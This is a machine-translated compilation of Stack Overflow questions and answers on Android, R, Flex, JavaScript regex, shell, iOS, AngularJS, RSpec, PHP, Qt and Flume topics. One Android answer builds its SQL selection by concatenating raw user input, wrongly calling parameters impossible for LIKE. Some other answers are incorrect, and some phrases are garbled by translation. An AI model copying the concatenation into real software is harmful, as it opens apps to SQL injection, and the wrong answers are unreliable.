W/Filter  ( 1303): android.database.CursorIndexOutOfBoundsException: Index 0 requested, with a size of 0
W/Filter  ( 1303):      at android.database.AbstractCursor.checkPosition(AbstractCursor.java:580)
W/Filter  ( 1303):      at android.database.AbstractWindowedCursor.checkPosition(AbstractWindowedCursor.java:214)
W/Filter  ( 1303):      at android.database.AbstractWindowedCursor.getString(AbstractWindowedCursor.java:41)
W/Filter  ( 1303):      at android.database.CursorWrapper.getString(CursorWrapper.java:135)
W/Filter  ( 1303):      at rebornlabs.sms2india.sms.app.ContactActivity.getSearchedContacts(ContactActivity.java:179)
W/Filter  ( 1303):      at rebornlabs.sms2india.sms.app.ContactActivity$3.runQuery(ContactActivity.java:102)
W/Filter  ( 1303):      at android.widget.CursorAdapter.runQueryOnBackgroundThread(CursorAdapter.java:309)
W/Filter  ( 1303):      at android.widget.CursorFilter.performFiltering(CursorFilter.java:49)
W/Filter  ( 1303):      at android.widget.Filter$RequestHandler.handleMessage(Filter.java:234)
W/Filter  ( 1303):      at android.os.Handler.dispatchMessage(Handler.java:99)
W/Filter  ( 1303):      at android.os.Looper.loop(Looper.java:123)
W/Filter  ( 1303):      at android.os.HandlerThread.run(HandlerThread.java:60) 
```

我期待查询中出现一些问题。不知道我错过了什么。

```
Cursor people = getContentResolver().query(uri, projection, selection, selectionArgs, null); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T19:21:10.557

如果您想根据部分结果进行搜索（如搜索“He”将给出结果“Hello”、“He-man”、“Heavy”、“Te He he”等，您应该使用 LIKE 而不是 a = ？ 陈述

前任。

```
String[] projection = new String[] {
   ContactsContract.Contacts._ID, 
   ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
   ContactsContract.CommonDataKinds.Phone.NUMBER 
};
String selection = ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " like '%" + inputText + "%'";

Cursor people = getContentResolver().query(uri, projection, selection, null, null); 
```

Like 语句不适合 selectionArgs 这就是为什么我为它们传递 null ..

此外，您需要更改代码流。如果您的光标不包含条目，则您仍在尝试从光标中检索值..尝试这样的事情..

```
while(people.moveToNext()) {
        String id = people.getString(idIdx);
        String name   = people.getString(indexName);
        String number = people.getString(indexNumber);
        // Do work...
    } 
```

您可以删除您的`if (!people.moveToFirst())`语句，因为它实际上除了打印日志语句之外什么都不做。while 语句将执行相同的检查，并且仅将数据分配给列表（如果存在）

# r - 滚动中位数

> ID：13845576
> 
> 赞同：1
> 
> 时间：2012-12-12T17:16:09.380
> 
> 标签：r, smoothing

我需要在 3 和 7 的 R 中做滚动中位数..（运行中位数）并绘制它们。我知道使用`smooth(x,"3R")`迭代直到它收敛。但我想做 7 的运行中位数进行比较，我输入的变量是：

```
xR7 <- rollmedian(x,7)
Age # at Age
0   558
1   513
2   582
3   604
4   584
5   566
6   562
7   524
8   529
9   430
10  497 
```

我怎么知道它何时收敛？有测试吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-12T18:09:16.777

用中位数重复平滑将逐渐在两端逐渐消失，`x`直到消失。您需要一些约定来为末端的运行中位数分配值。一种方法是“复制”：只需将第一个有效值复制回开头，将最后一个有效值复制到结尾。

检查收敛性的一种方法——一种相当严重的方法，但在这种情况下可能是安全的——只有在连续迭代完全相同时才停止。使用`identical`.

这导致以下过程：

```
library(zoo)

rollmedianR <- function(x, k=3) {
  n <- length(x)
  k.low <- floor((k+1)/2)
  k.high <- n + 1 - k.low
  repeat {
    y <- rollmedian(x, k, na.pad=TRUE)
    y[1:k.low] <- y[k.low]; y[k.high:n] <- y[k.high]
    if (identical(x, y)) break
    x <- y
  }
  return(y)
} 
```

作为测试，让我们将其与`smooth`一些随机数据进行比较：

```
set.seed(17)
x <- sin(seq(0, 2*pi, 2*pi/1000)) + rnorm(1001, 0.25)
0 >= var((smooth(x,"3R") - rollmedianR(x, 3)), rep(0.0, length(x))) 
```

> [1](https://i.stack.imgur.com/yo7d1.png)对

因为两个结果的差异没有变化，所以他们同意。好的。（顺便说一下，这个方差测试可以很好地在内部`rollmedianR`检查收敛性`identical`：它对浮点错误更稳健。原则上这不是中位数的问题，因为没有发生数值变化——值只是周围的副本——但在其他应用程序中具有这种鲁棒性是至关重要的。）

绘图可以显示长期运行中位数的作用：

```
plot(x, col="Gray", cex=0.8)
lines(rollmedianR(x,37), lwd=2, col="Red") 
```

![数据图和运行中位数](../Images/97423769d0dd04d6109e101033a794bf.png)

# apache-flex - Adobe flex 从列表组件到单选按钮

> ID：13845578
> 
> 赞同：1
> 
> 时间：2012-12-12T17:45:44.500
> 
> 标签：apache-flex, list, if-statement, adobe, radio-button

我已经尝试过很多方法，但是对于我的生活来说，我想不出该怎么做。基本上我有一个清单。选择列表上的项目时，单选按钮标签更改。但是，我希望在用户单击单选按钮后显示标签和文本区域是否正确。到目前为止的代码： -

```
<s:VGroup x="103" y="130" width="123" height="125">
    <s:RadioButton id="RadioButton1" label="{data.QuestionsRadioButton1}" groupName="QuestionsTestRadioButtons" click="RadioButton1_clickHandler(event)"/>
    <s:RadioButton label="{data.QuestionsRadioButton2}" groupName="QuestionsTestRadioButtons" click="radiobutton1_clickHandler(event)" />
    <s:RadioButton id="RadioButton3" label="{data.QuestionsRadioButton3}" groupName="QuestionsTestRadioButtons" click="radiobutton2_clickHandler(event)"/>
</s:VGroup> 
```

我不会发布所有代码，因为我们将永远在这里。但是，有没有办法可能是 if 函数？要说单击的单选按钮是否真的是正确答案？

任何建议都会有所帮助谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-13T15:10:24.577

我试图起草一个完整的例子：

**问卷调查.mxml**

```
<?xml version="1.0" encoding="utf-8"?>
<s:Application xmlns:fx="http://ns.adobe.com/mxml/2009" 
               xmlns:s="library://ns.adobe.com/flex/spark" 
               xmlns:local="*">
    <fx:Declarations>
        <s:ArrayCollection id="questions">
            <local:Question text="It is raining …">
                <s:ArrayCollection>
                    <local:Answer text="Men"/>
                    <local:Answer text="Cats and dogs" correct="true"/>
                    <local:Answer text="Candy"/>
                </s:ArrayCollection>
            </local:Question>
            <local:Question text="The sky is …">
                <s:ArrayCollection>
                    <local:Answer text="Blue" correct="true"/>
                    <local:Answer text="Orange" correct="true"/>
                    <local:Answer text="Grey" correct="true"/>
                    <local:Answer text="Green"/>
                </s:ArrayCollection>
            </local:Question>
        </s:ArrayCollection>
    </fx:Declarations>

    <s:DataGroup dataProvider="{questions}" itemRenderer="QuestionRenderer">
        <s:layout>
            <s:VerticalLayout gap="24"/>
        </s:layout>
    </s:DataGroup>
</s:Application> 
```

**QuestionRenderer.mxml**

```
<?xml version="1.0" encoding="utf-8"?>
<s:DataRenderer xmlns:fx="http://ns.adobe.com/mxml/2009" 
         xmlns:s="library://ns.adobe.com/flex/spark">
    <fx:Script>
        <![CDATA[
            [Bindable("dataChange")]
            public function get question():Question {
                return data as Question;
            }
        ]]>
    </fx:Script>

    <fx:Declarations>
        <s:RadioButtonGroup id="answerGroup"/>
    </fx:Declarations>

    <s:layout>
        <s:VerticalLayout/>
    </s:layout>

    <s:Label fontWeight="bold" text="{question.text}"/>

    <s:DataGroup dataProvider="{question.answers}">
        <s:layout>
            <s:HorizontalLayout/>
        </s:layout>
        <s:itemRenderer>
            <fx:Component>
                <s:DataRenderer>
                    <fx:Script>
                        <![CDATA[
                            import spark.components.RadioButtonGroup;

                            public function get answerGroup():RadioButtonGroup {
                                return outerDocument.answerGroup;
                            }
                        ]]>
                    </fx:Script>
                    <s:RadioButton groupName="answerGroup" label="{data.text}" value="{data}"/>
                </s:DataRenderer>
            </fx:Component>
        </s:itemRenderer>
    </s:DataGroup>

    <s:Label visible="{answerGroup.selectedValue}" text="This is {answerGroup.selectedValue.correct ? 'correct' : 'incorrect'}."/>
</s:DataRenderer> 
```

**问题.as**

```
package {
    import mx.collections.ArrayCollection;

    [Bindable]
    [DefaultProperty("answers")]
    public class Question {
        public var text:String;
        public var answers:ArrayCollection;
    }
} 
```

**答案.as**

```
package {
    [Bindable]
    public class Answer {
        public var text:String;
        public var correct:Boolean = false;
    }
} 
```

# javascript - 将正则表达式扩展为负数

> ID：13845580
> 
> 赞同：3
> 
> 时间：2012-12-12T17:45:49.997
> 
> 标签：javascript, jquery, regex

我想将以下正则表达式扩展到负数。

```
this.value = this.value.replace(/[^0-9\.]/g, ""); 
```

我尝试添加减号做这样的事情， (/[^-0-9.]/g, "") 但这允许在数字的任何地方输入减号。我想在数字的开头只允许出现一次减号。以后出现的减号应该被忽略。

请帮忙。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-12-12T17:55:24.297

呃，替换每个非数字字符会使这有点困难——就像“否定”正则表达式。我想出的是一个[负前瞻](http://www.regular-expressions.info/lookaround.html)`[^0-9.]`，如果它位于字符串的开头（使用[起始锚](http://www.regular-expressions.info/anchors.html)），则可以防止减号 - 将被匹配- 匹配：

```
….replace(/(?!^-)[^0-9.]/g, "") 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-12T17:57:19.050

为什么选择正则表达式？怎么样：

```
var temp = parseFloat(this.value)
this.value = isNaN(temp) ? "" : temp; 
```

这也应该有效：

```
var temp = +this.value;
this.value = isNaN(temp) ? "" : temp; 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-12T17:47:23.257

将破折号放在字符类之外：

```
this.value = this.value.replace(/^-?[^0-9\.]/g, ""); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-12T18:11:25.067

您提供的正则表达式对于正数本身是错误的，因为它将“100+200=300”转换为“100200300”。

我建议你试试这个： someString.match(/-?[\d]+.?[\d]*/);

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-11-05T15:52:58.600

只是把负号放在0前面

```
this.value = this.value.replace(/[^-0-9\.]/g, ""); 
```

# shell - 评估具有多个部分的 Unix 变量

> ID：13845581
> 
> 赞同：1
> 
> 时间：2012-12-12T17:45:51.137
> 
> 标签：shell, unix, solaris

如何在 Unix 中执行以下操作：

1) 变量 xxx_yyy=12345
2) 变量 aaa=yyy

我如何评估 xxx_$aaa 给我 12345。

请指教。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T20:44:07.187

在 bash 中使用[间接参数扩展](http://www.gnu.org/software/bash/manual/bashref.html#Shell-Parameter-Expansion)：

```
varname=xxx_$aaa
echo ${!varname} 
```

然而，动态变量名通常难以处理。更容易使用关联数组：

```
declare -A xxx
xxx[yyy]=12345
aaa=yyy
echo ${xxx[$aaa]} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T17:54:03.787

在 bash 中（可能还有其他：指定是否需要另一个），使用`eval`. 不要忘记转义第一个`$`，如图所示：

```
eval echo \$xxx_$aaa 
```

# ios - 当数据以 JSON 形式出现时，将数据从 tableViewController 保存和发送到 detailViewController 的正确方法是什么

> ID：13845584
> 
> 赞同：0
> 
> 时间：2012-12-12T17:45:59.137
> 
> 标签：ios, json, parameter-passing, tableview, segue

我想知道，保存和发送数据的“正确”方法是什么。假设我们收到 JSON。它的结构是这样的：

```
 {
    id = 1;
    country_id = 298;
    date = "2012-11-08 14:00:36";
    name = "Mr. Blank";
    profile = "http://somewhere.com/user1234/profile.png";
  } 
```

现在，我们有了 tableView，在 CustomCell 中我们显示个人资料图片、姓名和国家/地区 ID。点击后，我们想要转换到详细视图，我们再次显示个人资料图片，以及基于他的 id 的一些其他信息（基本上是新的 api 调用）。

现在，当我们收到第一个 JSON 时，我们应该考虑如何保存和发送像 id 和 profile pic 这样的值。

我知道两种方法，但我不确定它们是否“正确”。第一个是，一旦您的 json 到达，就将所有内容保存到数组中。所以它看起来像这样

```
NSMutableArray *idArr = [[NSMutableArray alloc]init];
NSMutableArray *picArr = [[NSMutableArray alloc]init];

    for (NSDictionary *recDict in jsonResults)
        {
            NSString *personsID = [recDict objectForKey:@"id"];
            [idArr addObject:personsID];
            NSString *pic = [recDict objectForKey:@"profile"];
            [picArr addObject:pic];

        } 
```

这种方法有效，但是，它总是将我们在 JSON 中获得的所有内容保存到数组中。所以当有很多行时，需要很长时间（特别是如果图片很大）。我知道，异步加载可能是解决方案，但我想在这里谈谈原理。

另一种方法是直接从选定的单元格传递值。这意味着，在方法 didSelectRowAtIndexPath

```
- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath
{
        MyCustomCell *cell = (MyCustomCell *)[tableView cellForRowAtIndexPath:indexPath];
    imageToSend = cell.profilePic.image; //we have UIImage *imageToSend;
    idToSend = cell.idLabel.text; //we have NSString *idToSend;
    [self performSegueWithIdentifier:@"showDetail" sender:self];
} 
```

这种方法的优点似乎是，tableView 默认使用“lazyload”（这意味着它会在用户向下滚动时加载单元格），所以在我看来，与第一种方法相比，它可以节省时间。

请你能给我一些关于你如何传递价值观的见解吗？我知道您应该使用 prepareForSegue 方法，但您无权访问 indexPath.row 那里。（因此您可以确定从何处调用该 segue）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T17:56:32.707

我更喜欢第二个。您不需要保存所有图像，只需保存 URL。应该异步加载图像（我使用[EGOImageLoading](https://github.com/enormego/EGOImageLoading)），然后您可以将图像或 URL 发送到新视图。

您可以使用 tableView indexPathForSelectedRow 从该行传递数据：

```
- (void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender
{
    NSIndexPath *path = [self.tableView indexPathForSelectedRow];
    YourObject *yourObject = [objectsArray objectAtIndex:path.row];
    [segue.destinationViewController setObject:yourObject];
} 
```

# iphone - 从 iphone 上的 ios 应用程序的新版本中删除 armv6

> ID：13845589
> 
> 赞同：0
> 
> 时间：2012-12-12T17:46:22.773
> 
> 标签：iphone, ios, xcode4.5, app-store-connect

这个问题已经让我们发疯了一段时间。我们有应用程序，都是用 Titanium 构建的（我之所以提到这一点，是因为我不能 100% 确定问题不是来自那里）。这些应用程序已在商店中发布，自每次发布以来，我们都会对其进行几次更新。

目前，他们支持 armv6 和 armv7。

对于下一次更新，我们要添加对 iphone 5 的支持，这意味着我们必须放弃对 armv6 的支持。这绝对没问题。我们也不介意将最低操作系统版本设置为 4.3。

所以我们将 xcode 中的构建设置更改为*armv7 armv7s*，将最小操作系统设置为 4.3，添加视网膜屏幕等等，构建应用程序。我们保持原样。当我们尝试验证应用程序时，我们会收到以下消息：

> 此捆绑包不支持该应用程序的先前捆绑包中支持的一个或多个设备

带有指向苹果手册页的链接：http: [//developer.apple.com/library/ios/#qa/qa1623/_index.html](http://developer.apple.com/library/ios/#qa/qa1623/_index.html)

这告诉我们错误可能是因为：

> 当您看到此错误消息时，您已更改“Targeted Device Family”构建设置（它修改了 UIDeviceFamily info.plist 键。）”

但我们没有。

此外，下面几行（在*Targeting the latest iOS*中）：

> 例如，如果您的应用不再使用 armv6 构建，则不应将 armv7 添加到 UIRequiredDeviceCapabilities。这可能会导致 Xcode 或 iTunes Connect 错误地拒绝您的更新。

当然，我们没有这样做。

我们甚至试图将应用程序版本更改为下一个主要版本，因为有人说它解决了这个问题。

有没有人知道我们如何永久删除 armv6 支持？我们找到的唯一解决方案是删除应用程序并这次仅使用 armv7 重新创建它。这当然是不可接受的，因为我们会丢失评论、评分等。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-14T13:40:49.283

您是否从“架构”和“有效架构”设置中删除了 armv6？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T17:40:59.943

好的，我设法让它工作，现在我想知道我们第一次尝试时出了什么问题。这是我最终所做的（仅此而已）：

*   采用 Titanium 中的当前版本
*   把它清理干净了
*   将 Titanium 中的版本设置为下一个主要版本（在我们的例子中为 2.0）
*   [重置环境以使用 xcode 4.5](https://wiki.appcelerator.org/display/tis/Configuring+XCode+inside+Titanium+Studio)（已经是这种情况，但我愿意为安全起见）
*   通过发布构建包，SDK设置为6.0
*   构建过程确认这没问题（[INFO] 最低 iOS 版本：4.3 链接 iOS 版本 6.0）
*   完成后，在 xcode 中验证包并上传

以下是我这次没有做的所有事情：

*   更改了 info.plist 中的任何内容
*   更改了构建架构中的任何内容
*   实际上xcode中的任何东西，除了验证和上传

# javascript - AngularJS - 删除绑定以避免内存泄漏

> ID：13845590
> 
> 赞同：14
> 
> 时间：2012-12-12T17:46:23.133
> 
> 标签：javascript, data-binding, memory-leaks, angularjs

AngularJS 中断开绑定的正确方法是什么？

我有一个非角度应用程序，它正在加载一个使用 angularjs 进行数据绑定的组件。在某些时候，我想销毁组件并希望确保没有内存泄漏。如何告诉 Angular 从 DOM 的那部分删除所有事件侦听器？

会`$(node).remove()`做到这一点，还是 angular 会在内存中做其他需要清理的事情......？任何其他有关避免角度内存泄漏的提示将不胜感激。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-12-12T19:44:58.503

仅删除具有类似 Scope 的 DOM 元素`remove()`不会摆脱内存中的 Scope。您可以通过删除一个元素并查看[Batarang](https://github.com/angular/angularjs-batarang)来确认这一点，或者通过获取父范围并检查它的子范围来确认这一点。您会看到范围仍然存在......所以您还需要调用`$destroy()`Scope 本身。

[更多关于 $destroy() 的信息可以在这里找到](http://docs.angularjs.org/api/ng.%24rootScope.Scope)。

编辑：我不确定的一件事是它是否完全删除了范围，或者只是断开它并让 JavaScript GC 处理其余部分。

# javascript - Javascript通过另一个函数将对象传递给函数

> ID：13845591
> 
> 赞同：0
> 
> 时间：2012-12-12T17:46:24.397
> 
> 标签：javascript, jquery, html, javascript-events

让我在开头说这不是我想要编写函数（内联和劫持）的方式，但我必须围绕第 3 方应用程序配置界面工作，并将更改源代码作为最终选项

所以我有一个调用 onclick 函数的图像

```
 <img src="images/button_closed.gif" id="img100023" border="0" 
  onclick="OnNodeImageClick(event, this)" href="theurl.cfm"> 
```

该函数接受 vars 事件，this 并获取 url

```
 function OnNodeImageClick(evt, clickedImage) {
    var href = clickedImage.getAttribute("href"); 
  ... 
```

我需要在共享原始 ID 号的单独元素上执行完全相同的逻辑

```
 <span id="node100023" >External Links</span> 
```

我试过的是这个作为html

```
 <span id="node100023" 
  onclick="javascript:OverwriteToTreeHandler($(this).attr('id'))">
  External Links</span> 
```

这是我的功能

```
 function OverwriteToTreeHandler(nodeID){
    var clickedItem = 'img'+nodeID.replace(/[^0-9]/g, '');  
        //tried $('body').find( clickedItem ) didnt work 
     OnNodeImageClick(event, clickedItem );
} 
```

但是我收到以下错误-> Uncaught TypeError: Object img100023 has no method 'getAttribute'

但是通过在 HTML 中静态分配标识符

我尝试过的是 html ，我得到了我想要的结果

```
 <span id="node100023" 
  onclick="javascript:OnNodeImageClick(event, img100023)">
  External Links</span> 
```

我认为这与参数有关，并且当我尝试动态获取元素时，它没有将其注册为对象，但我没有连接到这是如何完成的

提前感谢您的任何帮助

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T17:53:51.523

`OnNodeImageClick`应该是一个 DOM 元素 - 您正在传递一个字符串。试试这个：

```
function OverwriteToTreeHandler(nodeID) {
    var clickedItem = document.getElementById('img'+nodeID.replace(/[^0-9]/g, ''));

    OnNodeImageClick(event, clickedItem);
} 
```

此外，`this.id`当`$(this).attr('id')`您调用`OverwriteToTreeHandler`.

# ruby-on-rails-3 - 如何在 Rails 中存根路径生成方法？

> ID：13845594
> 
> 赞同：4
> 
> 时间：2012-12-12T17:46:29.293
> 
> 标签：ruby-on-rails-3, rspec, stubbing

我正在编写一个视图规范，它呈现一个包含该行的视图（在 haml 中）：

```
=link_to new_post_path 
```

但规范失败：

```
ActionController::RoutingError: No route matches {:action=>"new", :controller=>"post"} 
```

我正在尝试对该`new_post_path`方法进行存根，因为它对视图规范实际上并不重要，但没有任何运气。

在我的规范中，我尝试了以下两种变体，但没有任何运气：

```
 stub!(:new_post_path).and_return("this path isn't important")
controller.stub!(:new_post_path).and_return("this path isn't important") 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2016-10-19T23:31:10.290

如果您*不在*视图规范中，但发现自己需要存根路径助手，则以下语法适用于 Rails 4.2.5；您需要`receive_message_chain`按照此处所述：

[https://github.com/rspec/rspec-mocks/issues/1038](https://github.com/rspec/rspec-mocks/issues/1038)

以机智：

`allow(Rails.application).to receive_message_chain(:routes, :url_helpers, :new_post_path).and_return("this path isn't important")`

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-12T18:08:58.943

该方法`new_post_path`来自`Rails.application.routes.url_helpers`模块。您需要存根该模块上的方法

```
Rails.application.routes.url_helpers.stub(:new_post_path).and_return("this path isn't important") 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2015-06-16T23:39:39.060

```
allow(view).to receive(:new_post_path).and_return("this path isn't important") 
```

这是 rspec 3.2 语​​法

我想旧的语法是

```
view.stub(:new_post_path).and_return("this path isn't important") 
```

# php - 从 .sql 文件中提取值

> ID：13845595
> 
> 赞同：-1
> 
> 时间：2012-12-12T17:46:33.817
> 
> 标签：php, regex

我有一个 .sql 文件，其中包含从某个数据库中导出的代码

```
 # Dump File
    # Database is ported from MS Access
    CREATE DATABASE IF NOT EXISTS `movedb`;
    # Table structure for table 'test_prefixSwitchboard Items'
    DROP TABLE IF EXISTS `test_prefixSwitchboard Items`;
    CREATE TABLE `tbl` (
      `x` INTEGER NOT NULL, 
      `y` INTEGER NOT NULL DEFAULT 0, 
      `z` VARCHAR(255)
    ) ENGINE=innodb DEFAULT CHARSET=utf8;
    SET autocommit=1;
    #
    # Dumping data for table 'Switchboard Items'
    #
    INSERT INTO `tbl` ( `x`, `y`, `z`) VALUES ( '111' , '111' ,'111');
    INSERT INTO `tbl` ( `x`, `y`, `z`) VALUES ( '222' , '2222' ,'222');
    INSERT INTO `tbl` ( `x`, `y`, `z`) VALUES ( '333' , '333' ,'333'); 
```

我想将它的值放入我的数据库中，我的列名与 .sql 文件列名不同，所以我只需要提取值，即

```
'111' , '111' ,'111'
'222' , '2222' ,'222'
'333' , '333' ,'333' 
```

并且该文件中可能还有其他一些表，因此仅获取此表很重要。

我通常不会在不提供我自己的任何代码的情况下提出问题，但我很讨厌正则表达式的东西，至少对我来说这似乎很复杂。

**我必须补充一下，每隔几天就会有人上传这个文件。我想在将它们插入我的数据库之前向当前值添加一些值，所以我更喜欢使用正则表达式**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T17:51:03.680

您可以匹配该`VALUES (`部分，然后从那时起捕获文本，直到您点击`);`字符串的结尾，如下所示：

```
preg_match_all( '/VALUES\s+\(\s+(.*?)(?=\);\s*$)/', $file, $matches);

foreach( $matches[1] as $match) {
    echo $match;
} 
```

这将打印：

```
'111' , '111' ,'111' 
'222' , '2222' ,'222' 
'333' , '333' ,'333' 
```

**编辑：**对于表名，您可以将表名添加到正则表达式，然后翻阅列名，因为您不关心像这样捕获它们：

```
preg_match_all( '/`tbl`.*?VALUES\s+\(\s+(.*?)(?=\);\s*$)/m', $file, $matches); 
```

你可以在哪里改变`tbl`你需要的任何东西。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T18:02:47.043

这个问题可以通过将表以临时名称导入数据库，然后通过查询获取数据并删除表来解决。

```
# Dump File
# Database is ported from MS Access
CREATE DATABASE IF NOT EXISTS `movedb`;
# Table structure for table 'test_prefixSwitchboard Items'
DROP TABLE IF EXISTS `test_prefixSwitchboard Items`;
CREATE TABLE `tbl` (
  `x` INTEGER NOT NULL, 
  `y` INTEGER NOT NULL DEFAULT 0, 
  `z` VARCHAR(255)
) ENGINE=innodb DEFAULT CHARSET=utf8;
SET autocommit=1;
#
# Dumping data for table 'Switchboard Items'
#
INSERT INTO `tbl` ( `x`, `y`, `z`) VALUES ( '111' , '111' ,'111');
INSERT INTO `tbl` ( `x`, `y`, `z`) VALUES ( '222' , '2222' ,'222');
INSERT INTO `tbl` ( `x`, `y`, `z`) VALUES ( '333' , '333' ,'333');

CREATE TABLE `tb2` (
  `x2` INTEGER NOT NULL, 
  `y2` INTEGER NOT NULL DEFAULT 0, 
  `z2` VARCHAR(255)
) ENGINE=innodb DEFAULT CHARSET=utf8;
SET autocommit=1;

insert into tb2 (x2,y2,z2) select x, y, z from tbl;
drop table tbl; 
```

SQL小提琴：[http ://sqlfiddle.com/#!2/b97ce/1/0](http://sqlfiddle.com/#!2/b97ce/1/0)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-12T17:53:15.687

代替 REGEX，一种简单快捷的方法是将您的 .sql 文件导入 MySQL，然后将它们导出为 CSV。

您可以创建一个临时数据库以不稀释其他数据库。

如果这是一次性工作，您可以在 phpMyAdmin 中完成（手动，简单）。

如果这是一项重复性工作，您可以编写一个脚本来通过命令行自动导入 sql 和导出 csv。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-12T17:58:42.140

如果这不是您每天都在做的事情，更快的方法是在允许您“搜索/替换”的编辑器中实际编辑整个文件。例如 EditPLus。然后，您将替换所有匹配的内容

```
`tbl` ( `x`, `y`, `z`) 
```

至

```
`your_tbl` ( `your_x`, `your_y`, `your_z`) 
```

然后保存，导入编辑好的文件。

我知道这不是问题的真正技术解决方案，但很容易做到:)

# c++ - 将字符串转换为配对向量？

> ID：13845596
> 
> 赞同：-4
> 
> 时间：2012-12-12T17:46:34.957
> 
> 标签：c++, qt

我有一个字符串：

```
1,a,2,b,3,c etc 
```

我想将其转换为一对向量：

```
std::vector<std::pair<int, QString> > myVector; 
```

1 是 int，a 是字符串，2 是下一个 int，b 是下一个字符串，依此类推。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T17:57:06.823

```
int main()
{
  QString foo = "1,a,2,b,3,c";
  QStringList splits = foo.split(',');
  assert(splits.size() % 2 == 0); // check if even
  qDebug() << splits;

  std::vector< std::pair<int, QString> > vs;
  for(QStringList::const_iterator it = splits.begin(); 
      it != splits.end(); ++it) { 
    bool ok;
    QStringList::const_iterator tmp = it;
    ++it;

    vs.push_back(std::make_pair(tmp->toInt(&ok, 10), *it));
    assert(ok); // check if conversion worked
  }
  return 0;
} 
```

# hadoop - 如何在故障转移模式下配置 Flume 1.x (flume-ng)？

> ID：13845598
> 
> 赞同：2
> 
> 时间：2012-12-12T17:46:39.890
> 
> 标签：hadoop, load-balancing, flume

有大量关于在 CDH3 中以故障转移模式配置 Flume (0,9x) 节点的信息。

但是 CDH4 中 Flume (1.x) 配置的配置格式是完全不同的。如何在故障转移模式下配置 Flume 1.x (flume-ng)？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-13T19:28:26.573

在 flume-ng 中，您可以定义一组所谓的“接收器”（事件消费者），它们都连接到一个通道，并为该组指定“故障转移”策略，因此如果其中一个接收器发生故障，事件将被重定向到其他。

假设我们有两个接收器 - **main_sink**和**backup_sink**，它们都配置为使用来自一个通道的事件并将事件传递到某个目的地。我们将**main_sink**的优先级设置为大于**backup_sink**的优先级，这样 Flume 就会将事件从通道转发到**main_sink**，只要它工作正常。但是，如果**main_sink**失败，Flume 会将其降级到失败的 sinks 池中，在那里它将被分配一个冷却时间。同时来自频道的事件将被转发到**backup_sink**。

完整示例可能如下所示：

```
# channels
agent.channels = mem_channel
agent.channels.mem_channel.type = memory

# sources
agent.sources = event_source
agent.sources.event_source.type = avro
agent.sources.event_source.bind = 127.0.0.1
agent.sources.event_source.port = 10000
agent.sources.event_source.channels = mem_channel

# sinks
agent.sinks = main_sink backup_sink

agent.sinks.main_sink.type = avro
agent.sinks.main_sink.hostname = 127.0.0.1
agent.sinks.main_sink.port = 10001
agent.sinks.main_sink.channel = mem_channel

agent.sinks.backup_sink.type = avro
agent.sinks.backup_sink.hostname = 127.0.0.1
agent.sinks.backup_sink.port = 10002
agent.sinks.backup_sink.channel = mem_channel

# sink groups    
agent.sinkgroups = failover_group
agent.sinkgroups.failover_group.sinks = main_sink backup_sink
agent.sinkgroups.failover_group.processor.type = failover
agent.sinkgroups.failover_group.processor.priority.main_sink = 10
agent.sinkgroups.failover_group.processor.priority.backup_sink = 5 
```

[您可以在Flume 用户指南](http://flume.apache.org/FlumeUserGuide.html#flume-sink-processors)中找到有关该主题的更多详细信息。

# actionscript-3 - 如何在actionscript中跟踪代码执行顺序？

> ID：13845600
> 
> 赞同：2
> 
> 时间：2012-12-12T17:46:46.657
> 
> 标签：actionscript-3, apache-flex, flash-builder

我在 AIR 中编写一个移动应用程序，我经常遇到同样的问题：执行顺序是什么？我知道可以确定 UI 类的初始化、创建等顺序。我还可以将跟踪语句放入每个类的构造函数中，并这样做。但这很乏味。

是否有一段通用代码可以让每个类在加载时“宣布”自己？有没有人写过这样的东西？

伪代码类似于：

```
for each var class:Class in application
{
     trace(class.getQualifiedClassName.toString();
} 
```

谢谢。

编辑：

这是一个例子。我运行 MyApp.mxml 并在其上放置跟踪语句。第一个视图是一个由数组填充的列表，该数组通过 xml 来自服务器。但是当应用程序加载时，列表是空白的。为什么？由于以下事件顺序，基于我手动插入的跟踪语句：

```
MyApp::viewnavigatorapplication1_intitializeHandler firing
Model::initialize function firing
XMLLoader::going to http://mysite.com/myxml.xml
MyApp::addedToStageHandler running
HomeListView::viewActivateHandler firing
XMLLoader::xmlLoaded 
```

列表为空的原因是在激活 HomeListView*之后加载了 xml。*因此，有一种方法可以获取所有这些信息，而不必在课后的课堂上写下来，这将是有帮助的。请注意，并非所有类都在显示列表中（例如 Model 和 XMLLoader）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T22:20:37.620

`AS3Trace`在 mm.cfg 文件中指定将提供执行函数的完整流水线。

有关其他隐藏的 mm.cfg 功能，请参阅[此博客文章，](http://jpauclair.net/2010/02/10/mmcfg-treasure/)[这里是](http://blogs.adobe.com/rajorshi/2012/03/23/obtaining-trace-output-logs-on-device-for-air-on-ios/)让 mm.cfg 在您的移动应用程序中运行的一些帮助。

